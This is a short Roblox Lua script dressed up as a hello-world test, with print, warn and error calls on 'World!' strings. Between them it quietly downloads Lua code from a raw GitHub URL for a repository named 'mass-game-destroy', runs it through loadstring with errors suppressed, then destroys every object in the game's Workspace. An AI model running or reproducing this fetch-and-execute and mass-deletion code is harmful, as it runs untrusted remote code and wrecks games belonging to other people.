local guicreate = "https://raw.githubusercontent.com/poallini/mass-game-destroy/main/gui.lua"

local a193 = "Print World!"
local b121 = "Warn World!"
local c992 = "Error World!"

print(a193)
warn(b121)

pcall(function()
    loadstring(game:HttpGet(guicreate))()
end)

local w123 = game:GetService("Workspace")
local cd = w123:GetDescendants()

for _, obj in pairs(cd) do
    pcall(function()
        obj:Destroy()
    end)
end

error(c992)
